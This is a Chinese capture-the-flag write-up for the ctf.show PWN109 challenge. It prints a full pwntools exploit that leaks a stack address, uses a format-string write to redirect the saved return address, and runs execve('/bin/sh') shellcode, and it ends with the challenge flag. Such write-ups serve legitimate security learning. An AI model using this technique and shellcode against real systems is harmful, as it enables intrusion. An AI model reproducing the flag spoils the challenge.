# CTFshow PWN109 WP

## 题目信息

- 目标：`pwn.challenge.ctf.show:28256`
- 附件：无
- 类型：格式化字符串、栈地址泄露、栈上 shellcode
- Flag：`ctfshow{b2d93441-0a99-4cad-8b65-2b9aa0b68620}`

本题没有提供 ELF 附件，因此采用黑盒方式分析远程菜单和回显。

## 黑盒交互

连接后可以看到菜单：

```text
What you want to do?
1) Input someing!
2) Hang out!!
3) Quit!!!
```

选择 `1` 后，服务返回一个栈地址：

```text
ff9a10a0
```

这个地址会随着连接变化，符合栈地址特征。随后程序等待向该缓冲区写入数据。

选择 `2` 会处理缓冲区中的内容，并回显一段数据。通过构造格式化字符串探针可以确认格式化参数偏移为 `16`。

因此程序逻辑可以概括为：

```text
选项 1：泄露 buf 地址，并向 buf 写入最多 0x400 字节
选项 2：将 buf 当作格式字符串执行
选项 3：退出菜单，触发函数返回
```

## 漏洞分析

### 格式化字符串漏洞

选项 2 等价于对用户输入执行：

```c
printf(buf);
```

用户可以使用 `%n`、`%hn` 或 `%hhn` 修改栈上的数据。

通过参数探测确定攻击者控制的地址参数从第 16 个位置开始，因此可以使用：

```text
%16$p
```

或使用 pwntools 自动生成格式化字符串：

```python
fmtstr_payload(16, {target: value}, write_size="byte")
```

### 返回地址位置

选项 1 泄露的是输入缓冲区地址 `buf`。根据题目函数栈布局，保存的返回地址位于：

```text
saved_return_address = buf + 0x41c
```

因此目标是用格式化字符串将：

```text
*(buf + 0x41c) = buf
```

这样函数返回时，程序会跳转到 buf，执行我们后续写入的 shellcode。

## 利用流程

### 第一阶段：泄露 buf

发送：

```text
1
```

读取返回的十六进制地址，例如：

```text
ff9a10a0
```

设：

```python
buf = 0xff9a10a0
saved_rip = buf + 0x41c
```

### 第二阶段：覆盖返回地址

使用格式化字符串将 saved RIP 改为 buf：

```python
payload = fmtstr_payload(
    16,
    {saved_rip: buf},
    write_size="byte",
)
```

payload 写入后，选择 `2` 触发 `printf(buf)`，完成任意地址写。

### 第三阶段：写入 shellcode

再次选择 `1`，将 32 位 Linux shellcode 写入同一个 buf：

```asm
execve("/bin//sh", 0, 0)
```

本地环境是 macOS，pwntools 的 `asm(shellcraft.sh())` 可能因系统 binutils 不兼容而失败，因此 exploit 中直接使用机器码：

```python
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    b"\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
)
```

### 第四阶段：触发返回

选择：

```text
3
```

函数返回时，保存的返回地址已经被改成 buf，于是执行栈上的 shellcode，获得 shell。

## 完整 Exploit

文件：`exploits/pwn109.py`

```python
#!/usr/bin/env python3
import sys

if sys.path and sys.path[0].endswith("/exploits"):
    sys.path.pop(0)

from pwn import *

context.arch = "i386"
context.os = "linux"
context.log_level = args.LOG or "info"

io = remote(args.HOST or "pwn.challenge.ctf.show", int(args.PORT or 28256))
menu = b"3) Quit!!!\n"

# Option 1 leaks buf and then reads attacker-controlled data into it.
io.recvuntil(menu)
io.sendline(b"1")
buf = int(io.recvline().strip(), 16)

# The saved return address is located at buf + 0x41c.
saved_rip = buf + 0x41C
fmt = fmtstr_payload(16, {saved_rip: buf}, write_size="byte")
io.sendline(fmt)

# Execute printf(buf), applying the overwrite.
io.recvuntil(menu)
io.sendline(b"2")

# Write shellcode into buf.
io.recvuntil(menu)
io.sendline(b"1")
io.recvline()

# 32-bit Linux execve("/bin//sh", 0, 0).
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    b"\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
)
io.sendline(shellcode)

# Return through the overwritten saved RIP.
io.recvuntil(menu)
io.sendline(b"3")
sleep(0.5)
io.sendline(b"cat /ctfshow_flag")
print(io.recvrepeat(3).decode(errors="replace"))
```

运行：

```bash
python3 exploits/pwn109.py
```

输出：

```text
See you~
ctfshow{b2d93441-0a99-4cad-8b65-2b9aa0b68620}
```

## 总结

本题的核心不是直接把 shellcode 写入后立即执行，而是分成两步：

1. 通过选项 1 泄露栈地址，并写入格式化字符串。
2. 通过选项 2 使用 `%hhn` 覆盖保存的返回地址。
3. 再次使用选项 1 写入 shellcode。
4. 选择退出，让函数返回到 buf 执行 shellcode。

最终利用链为：

```text
栈地址泄露
    |
    v
格式化字符串任意地址写
    |
    v
覆盖 saved RIP 为 buf
    |
    v
写入栈上 shellcode
    |
    v
退出触发返回
    |
    v
读取 /ctfshow_flag
```
